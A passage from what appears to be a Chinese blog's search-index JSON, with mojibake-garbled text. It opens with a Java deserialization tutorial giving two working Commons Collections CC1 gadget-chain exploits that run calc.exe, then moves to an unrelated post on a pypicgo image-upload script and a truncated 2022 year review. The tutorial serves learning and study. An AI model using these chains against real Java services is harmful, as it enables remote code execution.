AnnotationType.getInstance(type);\n    } catch(IllegalArgumentException e) {\n        // Class is no longer an annotation type; time to punch out\n        throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n    }\n\n    Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n    // If there are annotation members without values, that\n    // situation is handled by the invoke method.\n    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n        String name = memberValue.getKey();\n        Class<?> memberType = memberTypes.get(name);\n        if (memberType != null) {  // i.e. member still exists\n            Object value = memberValue.getValue();\n            if (!(memberType.isInstance(value) ||\n                  value instanceof ExceptionProxy)) {\n                memberValue.setValue(\n                    new AnnotationTypeMismatchExceptionProxy(\n                        value.getClass() + \"[\" + value + \"]\").setMember(\n                            annotationType.members().get(name)));\n            }\n        }\n    }\n}\n```\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œ**AnnotationInvocationHandler**æ‰§è¡Œ`readObject`çš„æ—¶å€™è¿˜æœ‰ä¸¤ä¸ªifï¼Œä¿è¯ä¸¤ä¸ªiféƒ½ä¸ºtrueå°±è¡Œ\n\næ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx11d4a1facdf9c38ff96d464268783869chenghaiwen20230330231345-image-20230323163930553.png\n)\n\nè¿™é‡Œè·å–äº†æ³¨è§£(ä¹Ÿå°±æ˜¯**Override**)çš„å®ä¾‹\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxf0a39fca166bd53965b7710dced99a08chenghaiwen20230330231347-image-20230323164149685.png\n)\n\nç„¶ååœ¨è¿™é‡Œè·å–å…¶æˆå‘˜æ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯keyä¸ºæ–¹æ³•åï¼Œvalueä¸ºè¿”å›ç±»å‹ï¼‰\n\n**ä¸¾ä¸ªä¾‹å­**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx955818dc1ca1cc5ac1618f611de439a6chenghaiwen20230330231349-image-20230323164521508.png\n)\n\nè¯¥æ³¨é‡Šç±»ï¼Œæœ€ç»ˆå¾—åˆ°çš„**key**å’Œ**value**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxb8a330fc5f21aaac909dfef2ec3dce3echenghaiwen20230330231351-image-20230323164547504.png\n)\n\nç„¶åæ˜¯è¿™é‡Œ\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx17a2df5c17d7855ae11c50f0eacb1280chenghaiwen20230330231354-image-20230323164921088.png\n)\n\nå¯¹**memberValues**æ‰§è¡Œ**getKey**æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å¾—åˆ°æ­¤æ—¶**key**åï¼Œè€Œè¿™ä¸ªmapå°±æ˜¯æˆ‘ä»¬å‰é¢å®šä¹‰çš„**HashMap**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx9d85874c2625b0cc85de000c94c0cdcachenghaiwen20230330231356-image-20230323165049162.png\n)\n\nç„¶åå¾—åˆ°è¯¥**key**åä¹‹åï¼Œåœ¨å‰é¢æ³¨é‡Šç±»å¾—åˆ°çš„**key**å’Œ**value**æ‰§è¡Œ`get`æ–¹æ³•,`get(name)`æ–¹æ³•å°±æ˜¯å¯»æ‰¾**key=name**çš„**value**å€¼\n\nï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ­¤æ—¶æˆ‘ä»¬è¿™ä¸ª**HashMap**çš„**key**å€¼ç­‰äºæ³¨é‡Šç±»çš„**key**å€¼ï¼Œå°±èƒ½æˆåŠŸè¿”å›ä¸€ä¸ª**memberType**\n\nå°†è¿™é‡Œæ”¹ä¸º\"value\"\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxdfa1c18c7e1b9157ff9df8f530eb01e1chenghaiwen20230330231359-image-20230323165253923.png\n)\n\nå†æ¬¡æ‰§è¡Œï¼Œ**memberTypes**å°±ä¸æˆ‘ä»¬æ‰€æƒ³çš„ä¸€æ ·ï¼Œæ˜¯**Target**æ–¹æ³•çš„è¿”å›ç±»å‹\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxcd6eb9d17ef84b8e1c7acfcc0c0928a6chenghaiwen20230330231401-image-20230323165407550.png\n)\n\næ­¤æ—¶ç¬¬äºŒä¸ªifä¹Ÿæ˜¯å¯ä»¥ç›´æ¥é€šè¿‡çš„\n\n### è¡¥å……\n\nå‰é¢ç¼–å†™**chainedTransformer**çš„æ—¶å€™è¯´è¿‡ï¼Œæˆ‘ä»¬åªéœ€è¦ç¬¬ä¸€ä¸ªä¼ å…¥çš„å€¼æ˜¯**Runtime.class**ï¼Œåé¢çš„å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ„é€ å‡ºä¸€ä¸ªæ‰§è¡Œå®Œ`transform`åï¼Œè¿”å›çš„æ˜¯**Runtime.class**çš„ç±»\n\nè¿™é‡Œåˆè¦è¯´åˆ°ä¸€ä¸ªç±»**ConstantTransformer**\n\nå®ƒæ„é€ æ—¶ç»™**constantToReturn**ä¸€ä¸ª**Runtime.class**ï¼Œç„¶åå®ƒæ¥å—ä¸€ä¸ªObjectï¼Œéƒ½æ˜¯è¿”å›è¯¥**Runtime.class**ï¼Œå¾ˆç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa6c1bebb76d1c8db0ec4d5508c553937chenghaiwen20230330231403-image-20230323170838131.png\n)\n\nPSï¼šå› ä¸ºç¬¬ä¸€ä¸ª**input**çš„**Object**æ˜¯è¿™ä¸ªç±»ï¼Œä¸ç”¨ç®¡æ˜¯æ€ä¹ˆä¼ è¿›å»çš„...\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx59e7d20ecd8a01658e81f5963b5bdd60chenghaiwen20230330231405-image-20230323171033326.png\n)\n\n### Gadget Chain\n\nè‡³æ­¤ï¼Œæ•´ä¸ªé“¾å­å°±ç¼–å†™å®Œæˆäº†\n\n```java\npackage org.example;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.HashedMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.util.Map;\n\npublic class CC1Test {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        Map map = new HashedMap();\n        map.put(\"value\", \"value\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);\n\n        Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\n        annotationInvocationHandlerConstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);\n\n        serialize(o);\n        unserialize(\"ser.bin\");\n    }\n\n\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx15148c0880f6a46f73624f0e86f2a8dachenghaiwen20230330231408-image-20230323171401461.png\n)\n\nç†ä¸€ç†**Gadget Chain**\n\n```java\n/*    \n\tGadget chain:\n        AnnotationInvocationHandler.readObject();\n                transformedMap.entrySet();\n                    Entry.setValue();\n                        transformedMap.checkSetValue();\n                            chainedTransformer.transform();\n                                ConstantTransformer.transform();\n                                      Runtime.class;\n                                InvokerTransformer.transform();\n                                      Runtime.getMethod(\"getRuntime\", null);\n                                InvokerTransformer.transform();\n                                      Runtime.invoke(null, null);\n                                InvokerTransformer.transform();\n                                      Runtime.exec(\"calc.exe\");\n*/\n```\n\n<font color='pink'>**â€å®Œç»“æ’’èŠ±â€**</font>\n\n# ysoserial\n\n## åˆ†æ\n\n**ysoserial**çš„**CommonsCollections1**é“¾å’Œç™½æ—¥æ¢¦å¸ˆå‚…ä¸å¤ªä¸€æ ·ï¼Œå‰è€…æ˜¯å›½å¤–å‘ç°cc1é“¾æ—¶çš„é“¾å­ï¼Œåè€…æ—¶å›½å†…å¸ˆå‚…å¤ç°æ—¶æŒ–å‡ºæ¥çš„å¦å¤–ä¸€æ¡é“¾\n\n```java\n/*\n\tGadget chain:\n\t\tObjectInputStream.readObject()\n\t\t\tAnnotationInvocationHandler.readObject()\n\t\t\t\tMap(Proxy).entrySet()\n\t\t\t\t\tAnnotationInvocationHandler.invoke()\n\t\t\t\t\t\tLazyMap.get()\n\t\t\t\t\t\t\tChainedTransformer.transform()\n\t\t\t\t\t\t\t\tConstantTransformer.transform()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tClass.getMethod()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.exec()\n\tRequires:\n\t\tcommons-collections\n */\n```\n\nå¤§è‡´éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡mapä¸€ä¸ªç”¨çš„æ˜¯**LazyMap**ä¸€ä¸ªæ˜¯**transformedMap**ï¼Œ\n\nä½†æ˜¯**LazyMap**è¿™é‡Œæ˜¯åœ¨`get`æ–¹æ³•é‡Œé¢è°ƒç”¨çš„`transform`ï¼Œçœ‹é“¾å­æ˜¾ç¤ºçš„æ˜¯åœ¨`AnnotationInvocationHandler.invoke()`æ–¹æ³•ä¸­è°ƒç”¨çš„`LazyMap.get()`ï¼Œæ­£å¥½æ˜¯æˆ‘ä»¬è¾“å…¥çš„**map**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx0a15d99c1a690fce2b60da162be7cc78chenghaiwen20230330231411-image-20230327113723451.png\n)\n\nç„¶å**AnnotationInvocationHandler**å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œæ‰€ä»¥åªè¦æ‰§è¡Œè¯¥ç±»çš„æ–¹æ³•æ—¶å°±ä¸€å®šä¼šè¿›å…¥åˆ°`invoke`ï¼Œä½†æ˜¯è¦å†™ä¸€ä¸ªåŠ¨æ€ä»£ç†...ä½†æ˜¯åŠ¨æ€ä»£ç†æœ‰ç‚¹æŠ½è±¡ï¼Œè¿˜ä¸å¤ªæ‡‚ï¼Œç„¶åæŠŠé‚£ä¸¤ä¸ªifç»•è¿‡å°±å®Œäº‹\n\nä¸è¿‡åè¿‡æ¥æƒ³æƒ³ï¼ŒåŠ¨æ€ä»£ç†åœ¨javaååºåˆ—åŒ–å®‰å…¨ä¸­çš„ä½œç”¨å°±æ˜¯è¿›å…¥ç‰¹å®šçš„`invoke`æ–¹æ³•ï¼Ÿ\n\nç„¶ååŠ¨æ€ä»£ç†çš„å†™æ³•å…¶å®éƒ½æ˜¯å›ºå®šçš„ï¼Œä¼šå†™å°±è¡Œäº†ï¼Œä¹Ÿä¸ä¸€å®šéè¦ç†è§£\n\n## pop\n\nå‰é¢çš„**chainedTransformer**çš„æ„é€ æ˜¯ä¸€æ ·çš„\n\nç„¶åä»£ç†è¿™ï¼Œæˆ‘ä»¬ç›¸å½“äºæ˜¯ç»™**LazyMap**ä»£ç†äº†**AnnotationInvocationHandler**ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ª**æ–°çš„å¯¹è±¡**ï¼Œè¿™ä¸ªæ–°çš„å¯¹è±¡å¯ä»¥å¼ºè½¬å…¶ç±»å‹\n\næ‰€ä»¥æˆ‘ä»¬æ‰§è¡Œè¯¥**æ–°å¾—åˆ°çš„å¯¹è±¡**ä¸­çš„æ–¹æ³•æ—¶å°±ä¼šèµ°åˆ°**AnnotationInvocationHandler**çš„`invoke`æ–¹æ³•\n\nè€Œåœ¨**AnnotationInvocationHandler**çš„`readObject`ä¸­ï¼Œforè¯­å¥å°±å·²ç»æ‰§è¡Œäº†`entrySet()`ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿæ— éœ€ç»•è¿‡åé¢çš„if\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa377e7622e1c8bd2d033416103846afbchenghaiwen20230330231413-image-20230327115331239.png\n)\n\nç„¶å**AnnotationInvocationHandler**çš„åå°„éƒ¨åˆ†ä¹Ÿæ˜¯åŸºæœ¬ä¸€æ ·çš„ï¼Œåªä¸è¿‡éœ€è¦ç»™å®ƒçš„å®ä¾‹å¼ºè½¬æˆ**InvocationHandler**ï¼Œè€Œä¸å°±æ˜¯**Object**äº†ï¼ˆä»£ç†çš„æ„é€ å‡½æ•°å°±æ˜¯è¿™æ ·çš„\n\næœ€åçš„å…¥å£è¿˜æ˜¯**AnnotationInvocationHandler**çš„**readObject**ï¼Œæ‰€ä»¥æœ€åå†å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œæ”¾å…¥åˆšåˆšæ„å»ºçš„ä»£ç†ç±»å³å¯\n\næ‰€ä»¥å…¶å®è¿™ä¸ªé“¾å­æ˜¯æœ‰ä¸¤ä¸ª**AnnotationInvocationHandler**å®ä¾‹çš„ï¼Œè€Œ`invoke`æ–¹æ³•é‡Œçš„ifç»•è¿‡å°±æ˜¯æ‰§è¡Œçš„å‡½æ•°æ˜¯ä¸€ä¸ªæ— å‚å‡½æ•°ï¼Œå‰é¢å¯ä»¥çœ‹åˆ°`memberValues.entrySet()`ï¼Œæ­£å¥½å°±æ˜¯ä¸€ä¸ªæ— å‚å‡½æ•°ï¼Œå¤ªå·§äº†\n\næœ€ç»ˆçš„é“¾å­\n\n```java\npackage org.example;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.Map;\nimport java.util.HashMap;\n\npublic class CC1Test {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        Map<Object, Object> map = new HashMap<>();\n        Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);\n\n        Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\n        annotationInvocationHandlerConstructor.setAccessible(true);\n        InvocationHandler i = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, lazyMap);\n//æ„é€ ä»£ç†\n        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, i);\n\n        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, mapProxy);\n        //serialize(o);\n        unserialize(\"ser.bin\");\n    }\n\n\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    }\n}\n```\n\næœ€ç»ˆå‘ˆç°å‡ºæ¥çš„æ•ˆæœå°±æ˜¯æŠ¥é”™ï¼Œä½†æ˜¯æ­£å¸¸æ‰§è¡Œäº†å‘½ä»¤\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxc3c6936bf3528d63af41c0d470044c2cchenghaiwen20230330231416-image-20230327120525095.png)\n","tags":["javaå®‰å…¨"]},{"title":"è®°ä¸€æ¬¡å¥‡å¦™çš„å¼€å‘ä½“éªŒ","url":"/2023/03/30/è®°ä¸€æ¬¡å¥‡å¦™çš„å¼€å‘ä½“éªŒ/","content":"\n## å‰è¨€\nä¹‹å‰æ¢åšå®¢çš„æ—¶å€™æåˆ°ï¼Œå¾ˆå¤§ä¸€åŸå› æ˜¯å› ä¸º **typecho** ä¸Šä¼  **markdown** çš„æ—¶å€™ï¼Œä¸Šä¼ å›¾ç‰‡å¾ˆå¾ˆå¾ˆä¸æ–¹ä¾¿ã€‚æ¢ç”¨ **hexo** ä¹‹åï¼Œå…¶å®å¹¶æ²¡æœ‰å¾—åˆ°å¤ªå¤§æ”¹å–„ã€‚åæ¥ç”¨ä¸Šäº† **PicGo** åŠ ä¸Š **github** å›¾åºŠï¼Œå‰ªåˆ‡æ¿çš„å›¾ç‰‡å¯ä»¥ç”¨å¿«æ·é”®ä¸€é”®ä¸Šä¼ åˆ° **github** å¹¶ä¸”å¾—åˆ°å›¾ç‰‡é“¾æ¥ç„¶åæ”¹ä¸º **markdown** æ ¼å¼ï¼Œç¡®å®å¾ˆå¥½ç”¨ã€‚ä½†æ˜¯æˆ‘è®°ç¬”è®°å¤§éƒ¨åˆ†éƒ½æ˜¯æœ¬åœ°ï¼Œå¾ˆå¤šä¸å‘åšå®¢çš„ç¬”è®°å®Œå…¨æ²¡å¿…è¦è¿™æ ·åšï¼Œçº¯å±å¢åŠ åŠ³åŠ¨é‡ã€‚æ‰€ä»¥ä»Šå¤©æƒ³å‘ç¯‡åšå®¢çš„æ—¶å€™çœ‹ç€é‚£å‡ åå¼ å›¾ç‰‡ï¼Œä¸€ä¸ªä¸ªæ‹–ã€æ”¹ï¼Œå®åœ¨éš¾ä»¥ä¸‹æ‰‹ã€‚äºæ˜¯ï¼Œæˆ‘æƒ³ï¼Œèƒ½ä¸èƒ½æŠŠè¦å‘çš„ **markdown** ä¸€é”®ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶ä¸”è‡ªåŠ¨å°†é‡Œé¢çš„æœ¬åœ°å›¾ç‰‡é“¾æ¥æ”¹æˆå›¾åºŠçš„é“¾æ¥å‘¢ï¼Ÿäºæ˜¯ä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚\n## pypicgo\nè¿™ç§å°é‡çš„å·¥å…·è¿˜æ˜¯pythonæ–¹ä¾¿ï¼Œæˆ‘å…ˆæƒ³åˆ°çš„æ˜¯PicGoæœ‰æ²¡æœ‰å‘½ä»¤è¡Œç‰ˆæœ¬ï¼Œä½†å¹¶æœªå‘ç°ã€‚ç„¶åä¾¿çœ‹åˆ°äº†ä¸€ä¸ªpythonåŒ…ï¼Œ[pypicgo](https://github.com/AnsGoo/PyPicGo)\nè¯•äº†ä¸€ä¸‹ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå•çº¯çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œä¸èƒ½ç›´æ¥pythonå†…å¼•ç”¨å‡½æ•°\näºæ˜¯...å°±åªèƒ½ï¼Œå°è¯•æ”¹æ”¹è¿™ä¸ªåŒ…äº†\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd89737b111768818bdb57ffb0bb4e0b6chenghaiwen20230330232822-image-20230330223457538.png)\n\nè¿™ä¸ª **uploade.py** åå­—å°±å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œå¤§éƒ¨åˆ†çš„å¤–å±‚é€»è¾‘ä¹Ÿéƒ½åœ¨è¿™\n\nè¿™ä¸¤ä¸ªå‚æ•°å°±æ˜¯å‘½ä»¤è¡Œä¼ å‚çš„ä¸¤ä¸ªå‚æ•°ï¼Œ**file** æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘æ”¹æˆäº†m\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202303302340651.png)\n\n```python\nparser.add_argument('-m', '--mdfiles')\n```\n\nå¤§ä½“é€»è¾‘å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯æ­£åˆ™åŒ¹é…åˆ° **markdown** æ–‡ä»¶çš„æœ¬åœ°å›¾ç‰‡è·¯å¾„å¹¶å­˜å…¥ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åéå†ä¸Šä¼ è¿™äº›å›¾ç‰‡\n\nè¿™é‡Œæˆ‘ä¹Ÿå°±åŠ äº†ä¸¤ä¸ªå‡½æ•°\n\n```python\ndef mdFileFindImg(mdFile):\n    files = []\n    for line in mdFile:\n        if line.find('![') != -1:\n            start = line.find('(')\n            end = line.find(')', start)\n            files.append(line[start+1:end])\n    return files\n\n\n\ndef mdFileChange(mdFile, oldFilepath, newFilepath):\n    if mdFile.find(oldFilepath) != -1:\n        potision = mdFile.find(oldFilepath)\n        start = mdFile.find('![', potision - 30, potision)\n        end  = mdFile.find(')', potision)     \n        mdFile = mdFile.replace(mdFile[start:end + 1], '![](' + newFilepath + ')')\n    return mdFile\n```\n\nç¬¬ä¸€ä¸ªç”¨æ¥æ­£åˆ™åŒ¹é…è·¯å¾„ï¼Œç¬¬äºŒä¸ªç”¨æ¥å°† **æœ¬åœ°è·¯å¾„** æ”¹ä¸º **å›¾åºŠè·¯å¾„**\n\næ‰€ä»¥å¾ˆæ˜æ˜¾ï¼Œæ›´å…³é”®çš„é—®é¢˜æ˜¯å¦‚ä½•æ‰¾åˆ°è¿™ä¸ª **å›¾åºŠè·¯å¾„**ï¼Œè¿™ä¸ªç»“æœåœ¨è¿è¡Œçš„æ—¶å€™å…¶å®ä¼šæ‰“å°å‡ºæ¥ï¼Œä½†æ‰“å°çš„ä»£ç åœ¨\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202303302341976.png)\n\næˆ‘æ²¡æƒ³åˆ°ä»€ä¹ˆå¥½çš„æ–¹æ³•èƒ½å°†è¿™ä¸ª **message** ä¼ åˆ° **upload.py** ä¸­ï¼Œä¹‹å‰å…¶å®ä¹Ÿé‡åˆ°è¿‡è¿™ç§é—®é¢˜ï¼Œæœ€åæˆ‘çš„è§£å†³ä¸€èˆ¬éƒ½æ˜¯åºåˆ—åŒ–æˆæ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥å†™å…¥æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘å°±ç”¨äº†åè€…çš„åŠæ³•\n\nï¼ˆPSï¼šè¿™é‡Œçš„ **message** ï¼Œæ˜¯æ‰€æœ‰æ–‡ä»¶ä¸Šä¼ å®Œåæ‰“å°å‡ºæ¥ï¼Œæ‰“å°çš„æ˜¯æ‰€æœ‰çš„é“¾æ¥\n\n```\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxb4b959368a97541ee99cb9ce55f94e74chenghaiwen20230330220944-image-20230327163612053.png\n\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa695cf55618458b21f863dfe8adcfaa9chenghaiwen20230330220948-image-20230322171917611.png\n\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd4e8406dd0eaa317d3a413182c18044fchenghaiwen20230330220950-image-20230322172032540.png\n\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx584e7aec0dac759ce9ee3d7daa45b930chenghaiwen20230330220952-image-20230322172055370.png\n\n```\n\næ¯”å¦‚è¿™æ ·å­ï¼Œæ‰€ä»¥å¾—æ¸…é™¤ä¸€ä¸‹ç©ºè¡Œï¼Œç„¶åæ¯ä¸ªé“¾æ¥å ä¸€è¡Œè¿™æ ·å­\n\n```python\nimport sys, os\nfrom typing import List\nfrom pypicgo.core.base.plugin import FinallyPlugin\nfrom pypicgo.core.base.result import Result\n\n\nclass TyporaPlugin(FinallyPlugin):\n    name = 'Typora'\n\n    def execute(self, results: List[Result]):\n        urls = []\n        for result in results:\n            if result.status:\n                urls.append(result.remote_url)\n        if len(urls) > 0:\n            message = os.linesep.join(urls)\n            sys.stdout.write(f'Upload Success:{os.linesep}message{os.linesep}')\n            lines = [line for line in message.splitlines() if line.strip()]\n            f =  open('url.txt', 'w')\n            f.write('\\n'.join(lines))\n            f.close()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202303302341916.png)\n\nç„¶åç›´æ¥ä¸Šä¼  **markdown** å°±okå•¦\n\nä½†æ˜¯æœ‰å¯èƒ½å›¾åº“ä¸Šä¼ äº†ä½†æ˜¯æ–‡ä»¶è¿˜æ²¡æ”¹ï¼Œå’Œpythonæœ‰å…³ï¼Ÿå¦‚æœè¿™æ ·äº†ï¼Œå°±å¾—é‡æ–°ä¸Šä¼ ä¸€é\n","tags":["dev"]},{"title":"æˆ‘çš„2022","url":"/2022/12/31/æˆ‘çš„2022/","content":"\n2022æ˜¯æˆ‘è¿›å…¥å¤§å­¦çš„ç¬¬ä¸€å¹´ï¼Œè¿™ä¸€å¹´é‡Œç¡®å®å‘ç”Ÿäº†å¤ªå¤šå¤ªå¤šï¼Œè®©æˆ‘ä¹Ÿæ”¹å˜äº†å¾ˆå¤šï¼Œå°±éšå¿ƒå†™ç‚¹ä»€ä¹ˆæ¥ä¸ºè‡ªå·±çš„2022ç”»ä¸ªå¥å·å§ã€‚\n\nä»¥å‰æˆ‘å¯¹æ–‡å­—æ˜¯ä¸æ•æ„Ÿçš„ï¼Œæ ¹æœ¬ä¸ä¼šèŠ±æ—¶é—´æ¥æ€»ç»“æˆ–è®°å½•ä»€ä¹ˆã€‚ä½†æ˜¯è¿™ä¸€å¹´ï¼Œç”±äºå­¦ä¹ æ–¹é¢çš„åŸå› ï¼Œéœ€è¦å†™å¤§é‡æ–‡å­—ï¼Œæ…¢æ…¢çš„ä¹Ÿå˜å¾—å–œæ¬¢ä¸Šäº†å†™æ–‡å­—ï¼Œå¶å°”å†™äº›ä¸œè¥¿å‘å‡ºæ¥æˆ–è€…è®°å½•ä¸‹æ¥æ˜¯ä¸€ç§å¾ˆä¸é”™çš„ä½“éªŒï¼ˆè™½ç„¶æˆ‘æ ¹æœ¬æ²¡ä»€ä¹ˆæ–‡ç¬”  =ã€‚=ï¼‰ã€‚ç»†ç»†æƒ³æ¥ï¼Œè¿™ä¸€å¹´çœŸçš„æœ‰å¾ˆå¤šäº‹æƒ…å€¼å¾—è®°å½•ï¼Œä½†æˆ‘ä¹Ÿä¸ä¸€å®šèƒ½æƒ³èµ·æ¥ï¼Œæƒ³åˆ°ä»€ä¹ˆå°±å†™ä»€ä¹ˆå§ã€‚\n\n---\n\næˆ–è®¸å’Œå¾ˆå¤š**å¤§å­¦oré«˜ä¸­**çš„ç‹¬ç«‹æ¸¸æˆåˆ¶ä½œè€…ä¸€æ ·ï¼Œå¹´åˆç¬¬ä¸€ä»¶è®°å¿†æ·±åˆ»çš„äº‹æƒ…ä¸€å®šæ˜¯**GlobalGameJam**å§ï¼Œå½“æ—¶æˆ‘æ˜¯ä¸€ä¸ªä»€ä¹ˆéƒ½ä¸æ‡‚è‡ªå­¦äº†å°åŠå¹´çš„çº¯èŒæ–°ï¼Œå¥½åœ¨ç”¨unityåˆ¶ä½œç®€å•çš„æ¸¸æˆæ˜¯å¾ˆå®¹æ˜“çš„ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå‹‰å‹‰å¼ºå¼ºèƒ½è‡ªå·±åšä¸€äº›æœ‰æ„æ€çš„æ¸¸æˆ\n\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312105157.png)\n>\n> è¿™æ˜¯å‚åŠ **NovaGameJam**ï¼Œä¸´æ—¶ç»„äº†ä¸ªå°é˜Ÿåšçš„ç¬¬ä¸€ä¸ªæ¸¸æˆ **Vacuum Path**ï¼ˆç”±äºä¸æ˜¯ä»Šå¹´å‘ç”Ÿçš„ï¼Œè€Œä¸”å…³å¡è®¾è®¡çš„ä¹Ÿå¾ˆå·®ï¼Œå°±ä¸è¯´äº†ï¼‰\n\n\n\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312108907.png)\n>\n> è¿™æ˜¯åœ¨**GlobalGameJam**å‰å‡ 